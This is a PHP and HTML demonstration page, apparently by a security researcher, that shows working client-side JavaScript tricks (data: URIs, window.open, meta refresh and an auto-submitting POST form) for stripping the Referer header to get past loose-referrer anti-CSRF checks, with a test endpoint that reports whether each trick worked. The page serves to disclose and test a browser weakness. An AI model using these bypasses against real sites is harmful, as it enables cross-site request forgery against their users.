<?php
header('Content-Type: text/html;charset=utf-8');

?>
<h1>How to lose referer client-side?</h1>
<p>By <a rel="me" href="//blog.kotowicz.net">Krzysztof Kotowicz</a></p>
<p>Various web pages anti-CSRF feature depend on HTTP <code>Referer</code> header values. Sometimes it takes form of <strong>loose referrer checking</strong>:    
if <code>Referer</code> is from a third-party site, the request processing is blocked. However, loose referer checking allows requests with no referrer header at all.
<p>There are various ways to make a request losing the <code>Referer</code> header - most common is just doing a 30x redirect either through attacker's site or a third party
URL shortening service like <a href="//goo.gl">goo.gl</a>. I've tried to find ways how to do it <strong>client-side only</strong>, in Javascript. Here are the results.

<script>
var url = 'http://victim.kotowicz.net/lose-referer/test.php?text=hello';
function lose_referer() {
	// chrome loses it in data uris
	location = "data:text/html,<script>location='" + url + '&_=' + Math.random() + "'</scr"+"ipt>";
	return false;
}

function lose_in_ie() {
	// ie loses referer in window.open()
	window.open(url + '&_='+Math.random());
}

function lose_in_ff() {
	location = 'data:text/html,<html><meta http-equiv="refresh" content="0; url='+ url + '"></html>';
}

function post_and_lose() {
	location = 'data:text/html,<html><meta http-equiv="refresh" content="0; url=data:text/html,<form id=f method=post action=\''+url+'\'></form><script>document.getElementById(\'f\').submit()</scri'+'pt>"></html>';
}

</script>
<?php if (!empty($_GET['text'])) : ?>
<h2>Result</h2>
<div style="border: 1px dashed black; padding: 0.5em">
<?php
if (!empty($_SERVER['HTTP_REFERER'])) {
	echo '<p><font color=red>Boo: your referer is ' . htmlspecialchars($_SERVER['HTTP_REFERER']) . '</font></p>'; 
} else {
	echo '<p><font color=green>Success! No referer!</font></p>';
}

echo "<p>Method: <strong>" . htmlspecialchars($_SERVER['REQUEST_METHOD']) . '</strong>';
?>

<p><?php if (!empty($_REQUEST['text'])) echo htmlspecialchars($_REQUEST['text']); ?>
</div>
<p><a href="//attacker.kotowicz.net/lose-referer/test.php">Return to other test cases</a></p>
<?php else: ?>
<p>Standard link: <a href="//victim.kotowicz.net/lose-referer/test.php?text=hello">normal</a>
<h3>Bypasses:</h3>
<h4>GET requests</h4>
<ul>
<li><a href="#" onclick="lose_referer()">data: with location=</a> - Chrome / Safari
<li><a href="#" onclick="lose_in_ie();">window.open()</a> - MSIE
<li><a href="#" onclick="lose_in_ff();">data: with meta refresh</a> - Firefox / Opera / Chrome / Safari
</ul>
<h4>POST requests</h4>
<ul>
<li><a href="#" onclick="post_and_lose()">data: with meta refresh &amp; form submit</a> - Firefox / Chrome / Safari
</ul>
<?php endif; ?>
<p>Ideas welcome! Mail me at kkotowicz (it's a gmail account) or reach me on Twitter (@kkotowicz)
